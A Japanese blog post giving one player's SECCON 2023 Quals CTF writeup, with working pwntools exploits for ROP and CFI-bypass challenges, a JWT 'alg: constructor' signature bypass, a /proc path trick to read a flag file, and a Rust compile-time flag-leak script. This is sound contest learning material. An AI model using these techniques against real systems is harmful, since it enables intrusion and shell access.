---
title: "SECCON 2023 Quals Writeup"
date: 2023-09-18T14:02:32+09:00
categories:
- CTF
- writeup
tags:
- SECCON
thumbnailImage: /2023/09/seccon-2023-quals-writeup/cert.jpg
---

2023-09-16 〜 17 にかけて開催された SECCON 2023 予選に参加しました。
結果は全体 58位, 国内19位でした。

<!--more-->

{{<image classes="center nocaption" src="cert.jpg" title="Certificate of Participation, Term: 1y1, 832pt, Rank 58/653" thumbnail-width="500px" thumbnail-height="500px">}}

<!-- toc -->

## 7年ぶりにCTF

<abbr title="場面緘黙症があり、書くのも苦手で、しかも面接と診察が一番苦手な場面なので、人生がうまくいかなくて… 全てに嫌気が差してSNSなどのアカウントから何から全部消して2年間インターネットから消えてたり、その後もInfoSecから距離を取ったりしていました。当時のCTFプレーヤーなら私の正体の察しがつくと思います (OSINT 100)。">事情</abbr>があってCTFからずっと離れていたのですが、最近心境の変化があり、久し振りに参戦しました。最後の参加が2016年なので、7年ぶりですね。**7年!?**

{{<image classes="center fancybox" src="result.jpg" title="Team Profile" thumbnail-width="814px">}}

7年のブランクで腕が完全に錆びついている上にゴタゴタしてて事前にほとんど練習できなかったにもかかわらず、無謀にもソロで突っこんだので振るわない成績で終わってしまいました。国内チームは国内順位10位以上で予選通過できますが、当然通過できませんでした。鍛えなおさないといけませんね。  
特にCryptoは全くダメで、元々nolzeくん頼りで弱かったのに、さらに数学もRSAも完全に忘れてしまったのでwarmup問題すら解けませんでした。精進します…

### CTFって何すか (知らない人向け)
ハッキング競技です。出題された問題に攻撃するなり解読するなりして隠されたフラグと呼ばれる文字列を探しだすので、`Capture The Flag` (フラグを獲れ)、略してCTFと呼びます。獲らない競技形式もありますが、それもCTFと呼びます。

CTF知らない人はこの先を読んでもよく分からない気がする。

## 解いた問題
### Welcome (welcome)
連絡用のDiscordに貼ってあるFlagを入力します。参加者を確実に連絡用サーバーに誘導するいいアイデアですね。

### rop-2.35 (pwning)
問題:
```c
#include <stdio.h>
#include <stdlib.h>

void main() {
  char buf[0x10];
  system("echo Enter something:");
  gets(buf);
}
```

問題がReturn Oriented Programmingで`system("/bin/sh")`しろと叫んでいますね。NX EnabledでStack Smashing Protctorなしです。  
一見すると簡単なROP問で、[実際簡単なROP問です](https://www.youtube.com/live/jwM5OP81cl0?feature=shared&t=3976)。想定解ではROP gadgetすら不要です。

しかし、なぜか書いたexploitが実環境で動かなくて、「warpup問がこんな難しいはずがない、絶対に何かがおかしい」と思いつつ環境に依存しない無駄に複雑なチェーンに書き直したりしてたら2時間近くも嵌まってしまいました。こんなの10分でできないといけないですよ、ヘタクソ!

ところで、Flagが`SECCON{i_miss_you_libc_csu_init_:cry:}` だったのですが、これは2018年に現れた`return-to-csu`と呼ばれるROPの手法のことらしく、どうやら私が引退していた間に新しい攻撃法が現れ、そして対策されて消えていっていたみたいです。諸行無常。~~この手法現役時代に使ったことあるような…~~

exploit:
```python
from pwn import *

r = remote("rop-2-35.seccon.games", 9999)
# r = process("./chall")
# input()
buf = b""
p = b""
buf += b" " * (24 - len(p))
buf += p
buf += p64(0x40113d) #poprbp
buf += p64(0x404020 + 0x10) #rbp = gets@plt + 0x10
buf += p64(0x401171) #gets(rbp-0x10); rsp = rbp; pop rbp; ret
r.sendline(buf)

# 0x404020
buf = b""
buf += p64(0x401050) #gets@plt @ 0x404020 = system
buf += b"sh\0"
buf += b"A" * (0x10 - len(buf))
buf += p64(0x404020 + 8 + 0x10) #new rbp
buf += (p64(0x401016) + b"B" * 8) * 128 #rsp += 8; ret
buf += p64(0x401171) #gets == system, gets(rbp-0x10)
r.sendline(buf)
r.interactive()
```

### Bad JWT (web)

ペイロードの`isAdmin`が`true`のJWTを渡すとFlagを返してくれるwebサービスを攻略する問題です。

JWTの検証処理はこうなっています:
```javascript
// 抜粋:
const algorithms = {
	hs256: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
	hs512: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
}

const stringifyPart = (obj) => {
	return base64UrlEncode(JSON.stringify(obj));
}

const parsePart = (str) => {
	return JSON.parse(base64UrlDecode(str));
}

const createSignature = (header, payload, secret) => {
	const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
	const signature = algorithms[header.alg.toLowerCase()](data, secret); // <-- !!!!!!!!!
	return signature;
}

const parseToken = (token) => {
	const parts = token.split('.');
	if (parts.length !== 3) throw Error('Invalid JWT format');
	
	const [ header, payload, signature ] = parts;
	const parsedHeader = parsePart(header);
	const parsedPayload = parsePart(payload);
	
	return { header: parsedHeader, payload: parsedPayload, signature }
}

const verify = (token, secret) => {
	const { header, payload, signature: expected_signature } = parseToken(token);

	const calculated_signature = createSignature(header, payload, secret);
	console.log(header, payload, expected_signature, calculated_signature)
	
	const calculated_buf = Buffer.from(calculated_signature, 'base64');
	const expected_buf = Buffer.from(expected_signature, 'base64');

	if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
		throw Error('Invalid signature');
	}

	return payload;
}
```

JavaScriptにはこのような~~クソ~~楽しい仕様があるので:
```javascript
> {}.constructor
[Function: Object]
> Object("foo", "bar")
[String: 'foo']
```

ヘッダーの`alg`として`constructor`を渡すと、`createSignature()`の2行目が
```
const signature = algorithms[header.alg.toLowerCase()](data, secret);
↓
const signature = algorithms["constructor"](data, secret);
↓
const signature = Object(data, secret);
↓
const signature = data;
↓
const signature = `${stringifyPart(header)}.${stringifyPart(payload)}`;
```
となり、signatureの計算結果が予測可能な値にできてしまいます。

signatureに`.`を入れると`parseToken()`でエラーが出るので、一見`${stringifyPart(header)}.${stringifyPart(payload)}`をsignatureとして渡すことはできないように見えます。

しかし、`Buffer.from(..., 'base64')`にはBASE64にない文字を無視する仕様があるため、headerのが`alg`が`"constructor"`、payloadの`isAdmin`が`true`、signatureが`${stringifyPart(header)}${stringifyPart(payload)}`のトークンを渡せば、signatureが再計算結果 `${stringifyPart(header)}.${stringifyPart(payload)}`と一致すると判定されて検証を通ってしまいます。

### readme 2023 (misc)
問題:
```python
import mmap
import os
import signal

signal.alarm(60)

try:
    f = open("./flag.txt", "r")
    mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
except FileNotFoundError:
    print("[-] Flag does not exist")
    exit(1)

while True:
    path = input("path: ")

    if 'flag.txt' in path:
        print("[-] Path not allowed")
        exit(1)
    elif 'fd' in path:
        print("[-] No more fd trick ;)")
        exit(1)

    with open(os.path.realpath(path), "rb") as f:
        print(f.read(0x100))
```

`flag.txt`をメモリにマップした後、ファイル名に`flag.txt`と`fd`が含まれない任意のファイルの先頭256バイトを何度でも読みだせるプログラムを攻略する問題です。

`/proc/self`を悪用してくださいと言わんばかりな感じですが、`/proc/self/fd`は塞がれており、`/proc/self/map_files`を使おうにも、先頭256バイトしか読まないので`/proc/self/maps`ではflagの位置を特定できません。

結局 Pythonの`os.path.realpath()`に途中の要素がディレクトリでなくてもエラーにならないという仕様があることに気づき、`/proc/self/fd/1`へのシンボリックリンクの `/dev/stdout`を使って `/dev/stdout/../5` を読ませて解きました。

実は`/proc/self/auxv`や`/proc/self/syscall`で取れるアドレスとflagの相対位置は常に一定なので、これでアドレスを特定して`map_files`で読むのが想定解らしいです。

exploit:
```
/dev/stdout/../5
```

### jumpout (reversing)

難読化されたflag判定プログラムを解析してFlagを逆算する問題です。

デバッガで処理追っていくと、まずFlagの長さが29文字であることを確認し、次に`Flag xor 文字のインデックス xor 0x55 xor 謎のデータ`の結果が`謎のデータその2`と一致すると正解になることが分かります。Flagのかわりに`謎のデータその2`とxorすればFlagが逆算できますね。

```python
v1 = [
0xf6,0xf5,0x31,0xc8,0x81,0x15,0x14,0x68,
0xf6,0x35,0xe5,0x3e,0x82,0x09,0xca,0xf1,
0x8a,0xa9,0xdf,0xdf,0x33,0x2a,0x6d,0x81,
0xf5,0xa6,0x85,0xdf,0x17
]

v2 = [
0xf0,0xe4,0x25,0xdd,0x9f,0x0b,0x3c,0x50,
0xde,0x04,0xca,0x3f,0xaf,0x30,0xf3,0xc7,
0xaa,0xb2,0xfd,0xef,0x17,0x18,0x57,0xb4,
0xd0,0x8f,0xb8,0xf4,0x23
]

flag = []
for i in range(0x1d):
    flag.append(chr(i ^ 0x55 ^ v1[i] ^ v2[i]))
print("".join(flag))
```

`pwn.xor()`なる便利な関数がpwntoolsにあることを終了後に知りました。型からこちらの意図を察してよしなにやってくれるみたいです。賢い!
```python
>>> xor(v1,v2,0x55,list(range(len(v1))))
b'SECCON{jump_table_everywhere}'
```

実はわざわざ解析しなくてもangrに食わせれば一瞬で解けたらしいです。とくにソロプレイでは時間との戦いなので、こういう賢い解法をサッと思いつけるようになりたいですね。

### Perfect Blu (reversing)

{{<image classes="center nocaption" src="perfect-blu.jpg" title="Perfect Blu Screenshot">}}

こんな感じのBlu-ray ディスクを解析してFlagを特定する問題です。

Blu-ray ディスクのメニュー画面って仮想マシンで実装されているんですね。

仕様を調べたところ、どうやら `/BDMV/MovieObject.bdmv`にプログラムが入っているようなので、まずパーサーを書こうとしたものの、うまく動かないし時間がかかりすぎるので断念しました。

`BD_DEBUG_MASK=0x10000 BD_DEBUG_FILE=/tmp/bd-debug vlc ISO` のようにしてlibblurayのデバッグを有効にしたVLCで弄ってみると、どうやら選択肢が正解のときは `1→2→3→...`のように順番にチャプターが遷移し、不正解のときは離れたチャプター番号に飛ばされることが分かりました。  
これで選択した文字が正解か不正解か**決定後**に分かるようになったものの、不正解の後にモッサリ遅いBDのメニューで確定している部分を入力しなおすと時間がかかりすぎます。どうにかして決定前に遷移先を特定したい!

libblurayのソースコードを調べると、`_user_input`でキー入力を受けとって選択したボタンのデータ `(BD_IG_BUTTON*)` を取得しており、そのデータの`->nav_cmds`に決定時に実行されるコードが記録されていることが分かります。

あとはlibblurayをデバッグビルドし、

```nix
with import <nixpkgs> {}; let
  libbluray_ = enableDebugging libbluray;
in
  vlc.override {
    libbluray = libbluray_;
  }
```

gdbをアタッチしてこんな感じで遷移命令をダンプ

```gdb
set follow-fork-mode parent
set detach-on-fork on
b *(_user_input+855)
command 1
silent
p *(((BD_IG_BUTTON *)$rax)->nav_cmds+2)
continue
end
```

これでボタンを選択した段階で正解・不正解が分かるようになったので、後はFlagを一文字づつ調べていくだけです。

何で最初に動的解析せずにパーサーを書き始めて時間を無駄に浪費したんですかね。こういうのは、とても、良くない、ヘ タ ク ソ !!

実はdiffで遷移先が特定できるらしいです。とくにソロプレイでは時間との戦いなので、こういう賢い解法をサッと思いつけるようになりたいですね (2回目)。
{{< tweet user="kymn_" id="1703278268059979787" >}}

想定解が気になる…

### selfcet (pwning)

問題:
```c
#define INSN_ENDBR64 (0xF30F1EFA) /* endbr64 */
#define CFI(f)                                              \
  ({                                                        \
    if (__builtin_bswap32(*(uint32_t*)(f)) != INSN_ENDBR64) \
      __builtin_trap();                                     \
    (f);                                                    \
  })

#define KEY_SIZE 0x20
typedef struct {
  char key[KEY_SIZE];
  char buf[KEY_SIZE];
  const char *error;
  int status;
  void (*throw)(int, const char*, ...);
} ctx_t;

void read_member(ctx_t *ctx, off_t offset, size_t size) {
  if (read(STDIN_FILENO, (void*)ctx + offset, size) <= 0) {
    ctx->status = EXIT_FAILURE;
    ctx->error = "I/O Error";
  }
  ctx->buf[strcspn(ctx->buf, "\n")] = '\0';

  if (ctx->status != 0)
    CFI(ctx->throw)(ctx->status /* 32bit! */, ctx->error);
}

(snip)

int main() {
  ctx_t ctx = { .error = NULL, .status = 0, .throw = err };

  read_member(&ctx, offsetof(ctx_t, key), sizeof(ctx)); /* ctx_t全体が書き換え可能 */
  read_member(&ctx, offsetof(ctx_t, buf), sizeof(ctx)); /* ctx_tのbuf以降全部が書き換え可能 & スタックBOF */

  (snip)

  /* Stack Smashing Protectorあり */
  return 0;
}
```

Full RELRO, NX, Stack Smashing Protectorあり, No PIEで、先頭が`endbr64`の関数を2回、それぞれ32bitと64bitの引数2個渡して実行でき、スタックバッファオーバーフローもあるプログラムを攻略する問題です。

関数の初期値は`err()`で、第二引数のアドレスの内容をリークできますが途中で`exit()`してしまいます。しかし、実行環境(Ubuntu 22.04)のlibcは`err()`の近くにそれの`exit()`しないバージョンの`warnx()`があるので、関数ポインタを途中まで書き換えることでGOTをリークしてlibcのアドレスを特定できます。

しかし、第一引数が32bitなので、`0xffffffff`以降に配置されているlibc内の`/bin/sh\0`を使ってお手軽に`system("/bin/sh")`することができません。  
`endbr64`がない関数の途中を呼ばすこともできないので、うまくlibcを悪用してシェル実行に持ち込む必要があります。

自分は`signal()`が都合のよい引数を持っていて`__stack_chk_fail`が`SIGABRT`で自殺することを利用して`signal(SIGABRT, main)`で`main`に戻して解きましたが、これは想定解ではなく、

{{<tweet user="pwnyaa" id="1703283949328576549">}}

`arch_prctl(ARCH_SET_FS)` でTLSを差し替えてcanaryチェックを回避するのが想定解らしいです。これならリーク→canary置き換え→バッファオーバーフローの1パスで行けますね。  
しかし、`ld.so`がTLSをセットアップしていることを知っていたにもかかわらず、なぜか同じ方法で再設定する発想に至れてませんでした… こういうのよくないですね。

exploit:
```python
from pwn import *
import os
import time

libc = ELF("./libc.so.6")

for i in range(16):
   warnx_l16 = 0x0010 + 0x1000 * i
   print(f"trying: {warnx_l16:x}")

   # r = process("./xor", env={"LD_LIBRARY_PATH": os.getcwd()})
   # input()
   # warnx_l16 = 0x1010

   r = remote("selfcet.seccon.games", 9999)

   buf = b""
   buf += b"A" * 0x20 #key
   buf += b"B" * 0x1f + b'\n' #buf
   buf += b"C" * 8 # error (arg2)
   buf += p64(0x403ff8) # status (arg1) != 0, 32bit #err@got
   buf += p16(warnx_l16) #warnx

   r.send(buf)
   try:
      print(r.recvuntil(b"xor: "))
   except EOFError:
      r.close()
      continue
   break

a = r.recvuntil(b": Success\n")[:-len(b": Success\n")].ljust(8, b'\0')
err = u64(a)
print(f"err={err:x}")

base = err - libc.symbols["err"]
print(f"base={base:x}")
system = base + libc.symbols["system"]
signal  = base + libc.symbols["signal"]
gets = base + libc.symbols["gets"]
main = 0x401209

buf2 = b""
buf2 += b"B" * 0x1f + b'\n' #buf
buf2 += p64(main) # error (arg2)
buf2 += p64(6) # status (arg1) != 0, 32bit, SIGABRT
buf2 += p64(signal)
buf2 += b"A" * 0x20 #overflow
r.send(buf2)

print(r.recv(0x20))
print(r.recvline())

buf3 = b""
buf3 += b"A" * 0x20 #key
buf3 += b"B" * 0x1f + b'\n' #buf
buf3 += p64(0) # error (arg2)
buf3 += p64(0x404000) # status (arg1) != 0, 32bit
buf3 += p64(gets)
r.send(buf3)

r.sendline(b"/bin/sh")

time.sleep(5) #🤢

buf4 = b""
buf4 += b"B" * 0x1f + b'\n' #buf
buf4 += p64(0) # error (arg2)
buf4 += p64(0x404000) # status (arg1) != 0, 32bit, "/bin/sh"
buf4 += p64(system)
r.send(buf4)

r.interactive()
```

`mprotect()`してシェルコード実行に持ち込む、`on_exit()`で`main()`に戻すなどの方法もあったみたいです。
{{<tweet user="shojin_comp" id="1703306637300417000">}}
{{<tweet user="moratorium08" id="1703332110596227311">}}

### crabbox (misc)
問題:
```python
import sys
import re
import os
import subprocess
import tempfile

FLAG = os.environ["FLAG"]
assert re.fullmatch(r"SECCON{[_a-z0-9]+}", FLAG)
os.environ.pop("FLAG")

TEMPLATE = """
fn main() {
    {{YOUR_PROGRAM}}

    /* Steal me: {{FLAG}} */
}
""".strip()

print("""
🦀 Compile-Time Sandbox Escape 🦀

Input your program (the last line must start with __EOF__):
""".strip(), flush=True)

program = ""
while True:
    line = sys.stdin.readline()
    if line.startswith("__EOF__"):
        break
    program += line
if len(program) > 512:
    print("Your program is too long. Bye👋".strip())
    exit(1)

source = TEMPLATE.replace("{{FLAG}}", FLAG).replace("{{YOUR_PROGRAM}}", program)

with tempfile.NamedTemporaryFile(suffix=".rs") as file:
    file.write(source.encode())
    file.flush()

    try:
        proc = subprocess.run(
            ["rustc", file.name],
            cwd="/tmp",
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=2,
        )
        print(":)" if proc.returncode == 0 else ":(")
    except subprocess.TimeoutExpired:
        print("timeout")
```

Rustのコードを渡すとコンパイルして成功なら`:)`、失敗なら`:(`を返してくれるサービスを攻略する問題です。入力したコードの後にFlagの入ったコメントが追記されるので、どうにかしてこれを盗みだします。

Rustは `const _:() = assert!(...);` でコンパイル時assertができ、`include_bytes!()`でコンパイル時ファイル読み取り、さらに`file!()`でコンパイル中ソースファイルのパスを取得できるので、これらを組み合わせてFlagを1ビットづつ読み出します。よく考えたらASCIIなので7ビット目は0固定でよかったですね。

exploit:
```python
import os
from pwn import *

b4 = """fn main() {
    """

af = """

    /* Steal me: __FLAG__ */
}"""

offset = len(b4) + 512 + af.find("__FLAG__")

flag = "SECCON{"

while True:
    byte = 0
    for bit in range(7, -1, -1):
        p = ""
        p += f"const _: () = assert!(include_bytes!(file!())[{offset + len(flag)}] >= {byte | (1 << bit)});"
        p += " " * (511 - len(p))
        assert len(p) == 511

        #r = process(argv = ["python", "app.py"], env = {"FLAG": "SECCON{abcdefg}", "PATH": os.environ["PATH"]})
        r = remote("crabox.seccon.games", 1337)
        #print(p)
        r.sendline(p.encode())
        r.sendline(b"__EOF__")

        result = r.recvall().decode()
        #print(result)

        if ":)" in result:
            byte |= 1 << bit
        elif ":(" in result:
            pass
        else:
            raise "fail"

        r.close()
    flag += chr(byte)
    print(flag)
```

## おわり

戒め:
{{<tweet user="n_g_k_z" id="1703276281159458847">}}

完全に忘れてました:
{{<tweet user="n_g_k_z" id="1703276979536240869">}}

書いてる途中に受信した電波:  
`writeup`って直訳すると`かきあげ`だよね

ここまで読んてくれてありがとうね。
{{<image classes="center fancybox nocaption" src="satsuki.jpg" title="さつき" thumbnail-width="512px">}}
